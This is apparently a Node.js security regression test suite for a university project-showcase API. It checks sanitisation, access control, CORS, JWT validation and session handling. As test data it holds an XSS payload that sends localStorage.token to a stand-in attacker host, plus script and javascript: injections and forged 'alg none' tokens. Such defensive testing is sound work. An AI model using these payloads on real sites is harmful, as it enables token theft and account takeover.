// Testes de segurança: falhas corrigidas (regressão) e controles que precisam continuar valendo.
// A aplicação real (app.js) roda com o banco simulado.
const { test, describe, before, after, beforeEach, mock } = require('node:test');
const assert = require('node:assert/strict');
const { randomBytes, randomUUID } = require('node:crypto');

process.env.NODE_ENV = 'test';
process.env.JWT_SECRET = randomBytes(48).toString('hex');
process.env.JWT_EXPIRES_IN = '1d';
process.env.CREATOR_ALLOWED_DOMAINS = '@ifsc.edu.br,@aluno.ifsc.edu.br';
process.env.CLOUDINARY_CLOUD_NAME = 'techub-test';
process.env.CLOUDINARY_API_KEY = 'test-key';
process.env.CLOUDINARY_API_SECRET = 'test-secret';
process.env.DB_USER ??= 'teste';
process.env.DB_PASSWORD ??= 'teste';
process.env.DB_NAME ??= 'teste';
process.env.DB_HOST ??= 'localhost';
process.env.FRONTEND_URL = 'http://localhost:5173';

const sequelize = require('../src/config/database');
const { User } = require('../src/models');
const Project = require('../src/models/Project');
const ProjectMedia = require('../src/models/ProjectMedia');
const ProjectTechnology = require('../src/models/ProjectTechnology');
const ProjectCollaborator = require('../src/models/ProjectCollaborator');
const { signToken } = require('../src/utils/jwt');

const VIDEO = [{ url: 'https://youtu.be/dQw4w9WgXcQ', mediaType: 'video' }];

let server;
let baseUrl;
let users;
let projects;
let captured;

function addUser(role, extra = {}) {
  // emailVerifiedAt: contas de teste já confirmadas, para quando a confirmação de e-mail entrar.
  const user = User.build({
    name: `${role} teste`,
    email: `${role}-${randomUUID().slice(0, 6)}@aluno.ifsc.edu.br`,
    password: 'x',
    role,
    emailVerifiedAt: new Date(),
    ...extra,
  });
  users.set(user.id, user);
  return user;
}

// Como no banco real: depois de salvar, nenhum campo fica marcado como alterado.
function markSaved(user) {
  user._previousDataValues = { ...user.dataValues };
  user._changed = new Set();
}

function tokenOf(user) {
  return signToken({ sub: user.id, role: user.role });
}

function call(method, url, { user, token, body, headers = {} } = {}) {
  const auth = token || (user && tokenOf(user));
  return fetch(baseUrl + url, {
    method,
    headers: { 'Content-Type': 'application/json', ...(auth && { Authorization: `Bearer ${auth}` }), ...headers },
    body: body && JSON.stringify(body),
  });
}

function addProject(owner, approvalStatus) {
  const project = Project.build({
    id: randomUUID(), title: 'Projeto', description: 'Descrição original do projeto', ownerId: owner.id, approvalStatus,
  });
  mock.method(project, 'update', async (values) => {
    captured.update = values;
    Object.assign(project.dataValues, values);
    return project;
  });
  projects.set(project.id, project);
  return project;
}

before(async () => {
  mock.method(User, 'findByPk', async (id) => users.get(id) || null);
  mock.method(User, 'findOne', async ({ where }) => [...users.values()].find((u) => u.email === where.email) || null);
  mock.method(User, 'findAll', async (options) => { captured.userFindAll = options; return []; });
  mock.method(User.prototype, 'save', async function save() {
    await User.runHooks('beforeSave', this, {});
    markSaved(this);
    users.set(this.id, this);
    return this;
  });
  mock.method(sequelize, 'transaction', async (callback) => {
    const transaction = { LOCK: { UPDATE: 'UPDATE' }, commit: async () => {}, rollback: async () => {} };
    return typeof callback === 'function' ? callback(transaction) : transaction;
  });
  mock.method(Project, 'findByPk', async (id) => projects.get(id) || null);
  mock.method(Project, 'findAndCountAll', async (options) => { captured.list = options; return { count: 0, rows: [] }; });
  mock.method(Project, 'create', async (data) => { captured.create = data; return Project.build({ ...data, id: randomUUID() }); });
  mock.method(ProjectTechnology, 'destroy', async () => 0);
  mock.method(ProjectTechnology, 'bulkCreate', async () => []);
  mock.method(ProjectCollaborator, 'destroy', async () => 0);
  mock.method(ProjectCollaborator, 'bulkCreate', async () => []);
  mock.method(ProjectCollaborator, 'findOne', async () => null);
  mock.method(ProjectMedia, 'destroy', async () => 0);
  mock.method(ProjectMedia, 'bulkCreate', async (records) => records);

  // app.js real: Helmet, CORS, rotas, middlewares, validadores e controllers.
  const app = require('../src/app');
  server = app.listen(0, '127.0.0.1');
  await new Promise((resolve) => server.once('listening', resolve));
  baseUrl = `http://127.0.0.1:${server.address().port}/api`;
});

after(async () => {
  server.closeAllConnections();
  await new Promise((resolve) => server.close(resolve));
  mock.restoreAll();
});

beforeEach(() => {
  users = new Map();
  projects = new Map();
  captured = {};
});

describe('moderação: edição de projeto aprovado', () => {
  test('editar um projeto já aprovado devolve ele para a fila da moderação', async () => {
    const owner = addUser('creator');
    const project = addProject(owner, 'approved');
    const res = await call('PUT', `/projects/${project.id}`, {
      user: owner,
      body: { description: 'Conteúdo trocado depois da aprovação, sem nova análise' },
    });
    assert.equal(res.status, 200);
    assert.equal(captured.update.approvalStatus, 'pending', 'o projeto continuou aprovado e público sem nova análise');
  });
});

describe('HTML nos textos do projeto', () => {
  test('a API recusa HTML no título', async () => {
    const res = await call('POST', '/projects', {
      user: addUser('creator'),
      body: { title: '<b>XSS</b>', description: 'Descrição normal', media: VIDEO },
    });
    assert.equal(res.status, 400);
    assert.equal(captured.create, undefined);
  });

  test('a descrição guarda a formatação do editor e descarta o que pode executar código', async () => {
    const payload = '<b>Projeto</b> <i>legal</i><ul><li>item</li></ul><div style="text-align:center;color:red">centro</div>'
      + '<img src=x onerror="fetch(`//atacante.example/?t=`+localStorage.token)">'
      + '<script>alert(1)</script><a href="javascript:alert(1)">link</a><iframe src="//x"></iframe>'
      + '<div onclick="alert(1)">clique</div>';
    const res = await call('POST', '/projects', { user: addUser('creator'), body: { title: 'XSS', description: payload, media: VIDEO } });
    assert.equal(res.status, 201);
    const stored = captured.create.description;
    for (const kept of ['<b>Projeto</b>', '<i>legal</i>', '<ul><li>item</li></ul>', 'text-align:center']) {
      assert.ok(stored.includes(kept), `formatação perdida: ${kept}`);
    }
    for (const removed of ['<img', 'onerror', '<script', 'javascript:', '<iframe', 'onclick', 'color:red', '<a ']) {
      assert.ok(!stored.toLowerCase().includes(removed), `sobrou: ${removed}`);
    }
  });

  test('descrição com mais de 3000 caracteres de texto é recusada (as marcações não contam)', async () => {
    const creator = addUser('creator');
    const longa = await call('POST', '/projects', { user: creator, body: { title: 'T', description: 'a'.repeat(3001), media: VIDEO } });
    assert.equal(longa.status, 400);
    const formatada = await call('POST', '/projects', {
      user: creator,
      body: { title: 'T', description: `<b>${'a'.repeat(3000)}</b>`, media: VIDEO },
    });
    assert.equal(formatada.status, 201);
  });

  test('a edição também recusa HTML', async () => {
    const owner = addUser('creator');
    const project = addProject(owner, 'pending');
    const res = await call('PUT', `/projects/${project.id}`, { user: owner, body: { description: '<script>alert(1)</script>' } });
    assert.equal(res.status, 400);
    assert.equal(captured.update, undefined);
  });
});

describe('dados pessoais na listagem pública', () => {
  test('GET /projects (sem login) não busca o e-mail do autor', async () => {
    const res = await call('GET', '/projects');
    assert.equal(res.status, 200);
    const author = captured.list.include.find((item) => item.as === 'author');
    assert.ok(!author.attributes.includes('email'), 'a listagem pública retorna o e-mail de todos os autores');
  });
});

describe('paginação da listagem pública', () => {
  test('GET /projects?limit=100000 é limitado a 100 pelo servidor', async () => {
    const res = await call('GET', '/projects?limit=100000');
    assert.equal(res.status, 200);
    assert.equal(captured.list.limit, 100);
  });

  test('page/limit inválidos não viram erro 500', async () => {
    const res = await call('GET', '/projects?limit=abc&page=-3');
    assert.notEqual(res.status, 500);
    assert.ok(Number.isFinite(captured.list.limit) && captured.list.offset >= 0,
      `limit=${captured.list.limit} offset=${captured.list.offset} vão direto para o banco`);
  });
});

// ---- Controles que já estão corretos (devem continuar passando) ----

describe('controles de acesso', () => {
  test('cadastro público recusa o campo role (não cria super_admin)', async () => {
    const res = await call('POST', '/auth/register', {
      body: { name: 'x', email: 'x@aluno.ifsc.edu.br', password: 'Senha1234', accountType: 'creator', role: 'super_admin' },
    });
    assert.equal(res.status, 400);
  });

  test('cadastro de criador exige domínio institucional', async () => {
    const res = await call('POST', '/auth/register', {
      body: { name: 'x', email: 'x@gmail.com', password: 'Senha1234', accountType: 'creator' },
    });
    assert.equal(res.status, 400);
  });

  test('visitante não cadastra projeto', async () => {
    const res = await call('POST', '/projects', { user: addUser('visitor'), body: { title: 'x', description: 'y', media: VIDEO } });
    assert.equal(res.status, 403);
  });

  test('criador que não é dono nem colaborador não edita projeto de outro', async () => {
    const project = addProject(addUser('creator'), 'approved');
    const res = await call('PUT', `/projects/${project.id}`, { user: addUser('creator'), body: { title: 'invadido' } });
    assert.equal(res.status, 403);
  });

  test('criador não exclui projeto de outro', async () => {
    const project = addProject(addUser('creator'), 'approved');
    const res = await call('DELETE', `/projects/${project.id}`, { user: addUser('creator') });
    assert.equal(res.status, 403);
  });

  test('criador não consegue se auto-aprovar pelo PUT (approvalStatus é descartado)', async () => {
    const owner = addUser('creator');
    const project = addProject(owner, 'pending');
    const res = await call('PUT', `/projects/${project.id}`, { user: owner, body: { title: 'novo', approvalStatus: 'approved' } });
    assert.equal(res.status, 200);
    assert.notEqual(captured.update.approvalStatus, 'approved');
  });

  test('criador não acessa a área de moderação', async () => {
    const res = await call('PATCH', `/admin/projects/${randomUUID()}/approve`, { user: addUser('creator'), body: {} });
    assert.equal(res.status, 403);
  });

  test('projeto pendente não aparece para quem não é dono/colaborador', async () => {
    const project = addProject(addUser('creator'), 'pending');
    mock.method(Project, 'findByPk', async () => project, { times: 1 });
    const res = await call('GET', `/projects/${project.id}`, { user: addUser('creator') });
    assert.equal(res.status, 404);
  });

  test('busca de colaboradores devolve só id e nome (sem e-mail)', async () => {
    const res = await call('GET', '/projects/collaborators/search?q=ma', { user: addUser('creator') });
    assert.equal(res.status, 200);
    assert.deepEqual(captured.userFindAll.attributes, ['id', 'name']);
  });

  test('token assinado com outro segredo é recusado', async () => {
    const jwt = require('jsonwebtoken');
    const user = addUser('super_admin');
    const forged = jwt.sign({ sub: user.id, role: 'super_admin' }, 'segredo-adivinhado');
    const res = await call('GET', '/auth/me', { token: forged });
    assert.equal(res.status, 401);
  });

  test('token com alg "none" é recusado', async () => {
    const user = addUser('super_admin');
    const b64 = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');
    const forged = `${b64({ alg: 'none', typ: 'JWT' })}.${b64({ sub: user.id, role: 'super_admin' })}.`;
    const res = await call('GET', '/auth/me', { token: forged });
    assert.equal(res.status, 401);
  });
});

describe('CSRF e CORS', () => {
  test('a API ignora cookies: sem o cabeçalho Authorization a requisição é recusada', async () => {
    const res = await call('DELETE', `/projects/${randomUUID()}`, { headers: { Cookie: `token=${tokenOf(addUser('creator'))}` } });
    assert.equal(res.status, 401);
  });

  test('CORS não libera origens fora da lista', async () => {
    const res = await fetch(`${baseUrl}/projects`, {
      method: 'OPTIONS',
      headers: { Origin: 'https://site-malicioso.example', 'Access-Control-Request-Method': 'PUT' },
    });
    assert.equal(res.headers.get('access-control-allow-origin'), null);
  });

  test('CORS libera a origem do frontend', async () => {
    const res = await fetch(`${baseUrl}/projects`, {
      method: 'OPTIONS',
      headers: { Origin: 'http://localhost:5173', 'Access-Control-Request-Method': 'PUT' },
    });
    assert.equal(res.headers.get('access-control-allow-origin'), 'http://localhost:5173');
  });
});

describe('configuração do servidor', () => {
  // Carrega uma cópia nova do app.js com as variáveis de ambiente informadas.
  async function withApp(env, check) {
    const appPath = require.resolve('../src/app');
    const saved = Object.fromEntries(Object.keys(env).map((key) => [key, process.env[key]]));
    Object.assign(process.env, env);
    delete require.cache[appPath];
    try {
      const fresh = require('../src/app');
      const instance = fresh.listen(0, '127.0.0.1');
      await new Promise((resolve) => instance.once('listening', resolve));
      try {
        await check(fresh, `http://127.0.0.1:${instance.address().port}/api`);
      } finally {
        instance.closeAllConnections();
        await new Promise((resolve) => instance.close(resolve));
      }
    } finally {
      for (const [key, value] of Object.entries(saved)) {
        if (value === undefined) delete process.env[key];
        else process.env[key] = value;
      }
      delete require.cache[appPath];
    }
  }

  test('nenhuma resposta anuncia o Express, nem a do Swagger', async () => {
    for (const path of ['/projects', '/docs.json']) {
      const res = await fetch(baseUrl + path);
      assert.equal(res.headers.get('x-powered-by'), null);
    }
  });

  test('o Swagger não é servido no deploy de produção da Vercel', async () => {
    await withApp({ VERCEL: '1', VERCEL_ENV: 'production', API_DOCS: '' }, async (_, url) => {
      assert.equal((await fetch(`${url}/docs.json`)).status, 404);
    });
    await withApp({ VERCEL: '1', VERCEL_ENV: 'preview', API_DOCS: '' }, async (_, url) => {
      assert.equal((await fetch(`${url}/docs.json`)).status, 200);
    });
  });

  test('só confia no X-Forwarded-For quando roda na Vercel', async () => {
    await withApp({ VERCEL: '' }, async (fresh) => assert.equal(fresh.get('trust proxy'), false));
    await withApp({ VERCEL: '1' }, async (fresh) => assert.equal(fresh.get('trust proxy'), 1));
  });
});

describe('conexão com o banco', () => {
  test('em produção o certificado do banco é validado', () => {
    const config = require('../src/config/config');
    assert.equal(config.production.dialectOptions.ssl.rejectUnauthorized, true);
  });
});

describe('sessão e troca de senha', () => {
  async function userWithPassword(password) {
    const user = addUser('creator', { password });
    await User.runHooks('beforeSave', user, {});
    markSaved(user);
    return user;
  }

  async function login(user, password) {
    const res = await call('POST', '/auth/login', { body: { email: user.email, password } });
    assert.equal(res.status, 200);
    return (await res.json()).token;
  }

  test('o token emitido antes da troca de senha deixa de valer e a sessão atual recebe um novo', async () => {
    const user = await userWithPassword('SenhaAntiga123');
    const oldToken = await login(user, 'SenhaAntiga123');
    assert.equal((await call('GET', '/auth/me', { token: oldToken })).status, 200);

    const change = await call('PATCH', '/auth/me', {
      token: oldToken,
      body: { currentPassword: 'SenhaAntiga123', password: 'SenhaNova456' },
    });
    assert.equal(change.status, 200);
    const { token: newToken } = await change.json();

    assert.equal((await call('GET', '/auth/me', { token: oldToken })).status, 401);
    assert.equal((await call('GET', '/auth/me', { token: newToken })).status, 200);
  });

  test('alterar só o nome não derruba a sessão nem devolve token novo', async () => {
    const user = await userWithPassword('SenhaAntiga123');
    const token = await login(user, 'SenhaAntiga123');
    const res = await call('PATCH', '/auth/me', { token, body: { currentPassword: 'SenhaAntiga123', name: 'Outro nome' } });
    assert.equal(res.status, 200);
    assert.equal((await res.json()).token, undefined);
    assert.equal((await call('GET', '/auth/me', { token })).status, 200);
  });

  test('token com impressão de senha errada é recusado', async () => {
    const user = await userWithPassword('SenhaAntiga123');
    const forged = signToken({ sub: user.id, role: user.role, pwv: 'qualquer-coisa' });
    assert.equal((await call('GET', '/auth/me', { token: forged })).status, 401);
  });

  test('o token não carrega a senha nem o hash', async () => {
    const user = await userWithPassword('SenhaAntiga123');
    const token = await login(user, 'SenhaAntiga123');
    const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
    assert.deepEqual(Object.keys(payload).sort(), ['exp', 'iat', 'pwv', 'role', 'sub']);
    assert.ok(!JSON.stringify(payload).includes(user.password));
  });
});

describe('perfil público', () => {
  test('qualquer pessoa vê o perfil de um criador, sem e-mail nem papel', async () => {
    const creator = addUser('creator', { bio: 'Bio', github_url: 'https://github.com/x', expected_graduation: '2027/1' });
    const res = await call('GET', `/users/${creator.id}`);
    assert.equal(res.status, 200);
    const { profile } = await res.json();
    assert.equal(profile.name, creator.name);
    assert.equal(profile.github_url, 'https://github.com/x');
    assert.equal(profile.expected_graduation, '2027/1');
    for (const field of ['email', 'role', 'password', 'resume_public_id', 'createdAt']) {
      assert.equal(profile[field], undefined, field);
    }
  });

  test('visitante, administrador e ID inexistente não têm perfil público', async () => {
    for (const id of [addUser('visitor').id, addUser('super_admin').id, randomUUID()]) {
      assert.equal((await call('GET', `/users/${id}`)).status, 404);
    }
  });

  test('o perfil editável continua exigindo login', async () => {
    assert.equal((await call('GET', '/users/me')).status, 401);
    assert.equal((await call('GET', '/users/me', { user: addUser('creator') })).status, 200);
  });
});

describe('mensagens de erro', () => {
  const express = require('express');
  const { errorHandler, ApiError } = require('../src/middlewares/errorHandler');

  async function respostaDe(erro) {
    const app = express();
    app.get('/', (req, res, next) => next(erro));
    app.use(errorHandler);
    const server = app.listen(0, '127.0.0.1');
    await new Promise((resolve) => server.once('listening', resolve));
    try {
      const res = await fetch(`http://127.0.0.1:${server.address().port}/`);
      return { status: res.status, body: await res.json() };
    } finally {
      server.closeAllConnections();
      await new Promise((resolve) => server.close(resolve));
    }
  }

  test('erro inesperado não expõe a mensagem interna', async () => {
    const { status, body } = await respostaDe(new Error('senha do banco: segredo123'));
    assert.equal(status, 500);
    assert.equal(body.message, 'Erro interno do servidor.');
  });

  test('ApiError 5xx mostra a mensagem escrita por nós', async () => {
    const { status, body } = await respostaDe(new ApiError(503, 'Upload de mídias indisponível no momento.'));
    assert.equal(status, 503);
    assert.equal(body.message, 'Upload de mídias indisponível no momento.');
  });
});

describe('rascunhos', () => {
  test('atualizar rascunho ignora approvalStatus, ownerId e parecer vindos do cliente', async () => {
    const owner = addUser('creator');
    const draft = addProject(owner, 'draft');
    const res = await call('PUT', `/projects/draft/${draft.id}`, {
      user: owner,
      body: { title: 'Meu rascunho', approvalStatus: 'approved', ownerId: randomUUID(), reviewNotes: 'ok', submittedAt: '2020-01-01' },
    });
    assert.equal(res.status, 200);
    assert.equal(captured.update.title, 'Meu rascunho');
    for (const field of ['approvalStatus', 'ownerId', 'reviewNotes', 'submittedAt']) {
      assert.equal(captured.update[field], undefined, field);
    }
  });

  test('criar rascunho sempre grava como rascunho e do próprio usuário', async () => {
    const creator = addUser('creator');
    const res = await call('POST', '/projects/draft', {
      user: creator,
      body: { title: 'Novo', approvalStatus: 'approved', ownerId: randomUUID() },
    });
    assert.equal(res.status, 201);
    assert.equal(captured.create.approvalStatus, 'draft');
    assert.equal(captured.create.ownerId, creator.id);
  });

  test('rascunho segue as regras de conteúdo: sem HTML no título e sem mídia de fora', async () => {
    const owner = addUser('creator');
    const draft = addProject(owner, 'draft');
    const bodies = [
      { title: '<img src=x onerror=alert(1)>' },
      { media: [{ url: 'https://rastreador.example/pixel.png', mediaType: 'image' }] },
    ];
    for (const body of bodies) {
      const res = await call('PUT', `/projects/draft/${draft.id}`, { user: owner, body });
      assert.equal(res.status, 400, JSON.stringify(body));
    }
    assert.equal(captured.update, undefined);
  });

  test('outra pessoa não edita o rascunho', async () => {
    const draft = addProject(addUser('creator'), 'draft');
    const res = await call('PUT', `/projects/draft/${draft.id}`, { user: addUser('creator'), body: { title: 'invadido' } });
    assert.equal(res.status, 403);
  });

  test('só rascunho pode ser enviado para análise', async () => {
    const owner = addUser('creator');
    const approved = addProject(owner, 'approved');
    const res = await call('POST', `/projects/${approved.id}/submit`, {
      user: owner,
      body: { title: 'Projeto', description: 'Descrição suficiente', media: VIDEO },
    });
    assert.equal(res.status, 400);
  });
});
